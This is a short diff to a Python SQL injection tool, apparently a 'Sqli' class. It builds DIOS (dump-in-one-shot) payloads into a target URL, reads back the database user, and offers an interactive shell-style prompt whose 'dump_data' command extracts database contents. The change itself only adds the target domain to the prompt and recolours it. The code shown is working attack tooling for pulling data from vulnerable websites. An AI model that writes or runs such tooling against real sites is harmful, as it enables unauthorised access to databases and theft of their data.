@@ -73,13 +73,14 @@ class Sqli:
         }
     
     def command_line(self):
-        user = Dios().build(Dios().user())
+        user   = Dios().build(Dios().user())
+        domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]
         try:
             response = requests.get(self.url.replace('*',user))
             sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
             user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
             user        = user.group(1)
-            cmd         = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
+            cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")
             if cmd == "dump_data":
                 r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
                 output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
